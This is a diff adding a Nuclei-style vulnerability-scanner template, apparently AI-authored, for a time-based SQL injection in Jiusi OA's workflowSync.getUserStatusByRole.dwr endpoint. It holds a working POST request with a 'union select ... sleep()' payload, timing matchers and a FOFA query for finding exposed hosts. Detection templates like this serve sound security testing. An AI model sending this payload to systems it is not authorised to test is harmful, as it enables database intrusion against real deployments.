@@ -1,0 +1,44 @@
+id: poc-yaml-jiusi-workflowsync-getuserstatusbyrole-dwr-sqli
+info:
+  name: 九思OA workflowSync.getUserStatusByRole.dwr SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 九思OA
+    fofa: app="九思软件-OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        callCount=1
+        c0-scriptName=workflowSync
+        c0-methodName=getUserStatusByRole
+        c0-id=1
+        c0-param0=string:1
+        c0-param1=string:1 union select 0,sleep({{t1}})#
+        xml=true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "var s0=\"\""
+          - "DWREngine._handleResponse"
+        part: body
+      - type: regex
+        regex:
+          - "^[^<]*$"
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
